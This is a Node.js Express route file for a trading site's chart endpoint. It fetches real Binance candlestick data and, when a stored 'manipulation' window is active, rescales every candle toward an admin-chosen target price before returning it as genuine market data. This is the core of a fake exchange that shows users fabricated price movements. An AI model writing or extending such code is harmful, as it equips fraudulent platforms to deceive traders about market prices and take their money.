const express = require('express');
const axios = require('axios');
const MarketPrice = require('../MarketPrice');
const router = express.Router();

// Fetch klines (candlestick) data from Binance
router.get('/klines', async (req, res) => {
  const { symbol, interval, limit } = req.query;
  // Normalize symbol (accept both BTCUSDT and BTC/USDT from clients)
  const normalizedSymbol = (symbol || '').replace('/', '').toUpperCase();
  console.log(`[CHARTS] Received request for ${symbol} (normalized: ${normalizedSymbol}) with interval ${interval}`);

  // Validate required parameters
  if (!symbol || !interval) {
    return res.status(400).json({ message: 'Symbol and interval are required' });
  }

  // Validate interval
  const validIntervals = ['1m', '5m', '15m', '1h', '4h', '1d', '1w'];
  if (!validIntervals.includes(interval)) {
    return res.status(400).json({ message: 'Invalid interval' });
  }

  try {
    // Construct the Binance API URL
    const binanceUrl = 'https://api.binance.com/api/v3/klines';

    // Fetch data from Binance (use normalized symbol)
    const response = await axios.get(binanceUrl, {
      params: {
        symbol: normalizedSymbol,
        interval: interval,
        limit: limit || 100,
      },
    });

    const data = response.data;
    console.log(`[CHARTS] Fetched ${data.length} candles from Binance.`);

    // Check if there's an active price manipulation for this symbol
    const marketPrice = await MarketPrice.findOne({ symbol: normalizedSymbol });
    let manipulatedData = data;
    if (marketPrice && marketPrice.manipulation) {
      const manip = marketPrice.manipulation || {};
      // Support both Date objects and numeric timestamps
      const startTime = manip.startTime ? new Date(manip.startTime) : null;
      const endTime = manip.endTime ? new Date(manip.endTime) : null;
      const now = new Date();

      if (manip.isActive && startTime && endTime && now >= startTime && now <= endTime) {
        console.log('[CHARTS] Active manipulation found for symbol:', normalizedSymbol);
        console.log('[CHARTS] Manipulation is currently active. Scaling entire chart...');

        if (data && data.length > 0) {
          const totalDuration = endTime - startTime;
          const timeSinceStart = now - startTime;
          const progress = totalDuration > 0 ? Math.min(timeSinceStart / totalDuration, 1) : 1;

          // Determine a safe start price and target price with fallbacks
          const lastCandle = data[data.length - 1];
          const originalLastClose = lastCandle ? parseFloat(lastCandle[4]) : marketPrice.price || 1;

          const startPrice = (typeof manip.originalPrice === 'number' && !isNaN(manip.originalPrice))
            ? manip.originalPrice
            : (marketPrice.price || originalLastClose);

          const targetPrice = (typeof manip.endValue === 'number' && !isNaN(manip.endValue))
            ? manip.endValue
            : startPrice;

          const priceDifference = targetPrice - startPrice;
          const currentManipulatedPrice = startPrice + (priceDifference * progress);

          console.log(`[CHARTS] Current manipulation progress: ${Math.round(progress * 100)}%`);
          console.log(`[CHARTS] Current ideal manipulated price: ${currentManipulatedPrice}`);

          // Calculate scale ratio based on last close
          const ratio = originalLastClose > 0 ? currentManipulatedPrice / originalLastClose : 1;
          console.log(`[CHARTS] Scaling ratio to apply to chart: ${ratio}`);

          manipulatedData = data.map((candle) => {
            // Safely parse numeric OHLC values and apply ratio
            const o = parseFloat(candle[1]) || 0;
            const h = parseFloat(candle[2]) || 0;
            const l = parseFloat(candle[3]) || 0;
            const c = parseFloat(candle[4]) || 0;

            return [
              candle[0], // timestamp
              (o * ratio).toString(),
              (h * ratio).toString(),
              (l * ratio).toString(),
              (c * ratio).toString(),
              candle[5], // volume
            ];
          });

          console.log(`[CHARTS] Finished scaling all ${data.length} candles based on active manipulation.`);
        }
      } else {
        console.log('[CHARTS] No active manipulation window currently for symbol:', normalizedSymbol);
      }
    } else {
      console.log('[CHARTS] No manipulation configuration found for symbol:', normalizedSymbol);
    }

    // Format the data for lightweight-charts and include ISO timestamp
    const formattedData = manipulatedData.map((d) => ({
      time: Math.floor(d[0] / 1000), // seconds
      timestamp: new Date(d[0]).toISOString(),
      open: parseFloat(d[1]),
      high: parseFloat(d[2]),
      low: parseFloat(d[3]),
      close: parseFloat(d[4]),
      volume: parseFloat(d[5]) || 0,
    }));

    res.json({ symbol, interval, data: formattedData });
  } catch (error) {
    console.error('Error fetching klines data:', error?.message || error);
    res.status(500).json({ message: 'Server error fetching chart data', error: error.message });
  }
});

module.exports = router;
